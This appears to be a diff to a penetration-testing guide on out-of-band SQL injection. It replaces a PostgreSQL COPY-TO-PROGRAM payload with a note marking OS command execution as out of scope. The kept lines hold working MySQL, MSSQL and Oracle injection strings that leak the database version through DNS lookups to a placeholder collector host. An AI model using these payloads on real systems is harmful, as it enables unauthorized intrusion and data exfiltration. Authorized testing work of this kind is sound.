@@ -92,7 +92,9 @@ Interleave the samples (as above) so a slow network minute cannot fake a result.
 ```
 MySQL  (Windows):  ' AND LOAD_FILE(CONCAT('\\\\',@@version,'.oob.<collector>\\a'))-- -
 MSSQL:             '; EXEC master..xp_dirtree '\\'+@@version+'.oob.<collector>\a'--
-PostgreSQL:        '; COPY (SELECT '') TO PROGRAM 'nslookup $(version).oob.<collector>'--
+PostgreSQL:        no safe OOB primitive - `COPY ... TO PROGRAM` is OS command execution on
+                   the DB server, which is past this skill's stop point. Use the boolean or
+                   timing oracle instead, and route any command-execution path to zp-rce-ssti.
 Oracle:            ' AND (SELECT UTL_INADDR.get_host_address('oob.<collector>'))IS NOT NULL--
 ```
 
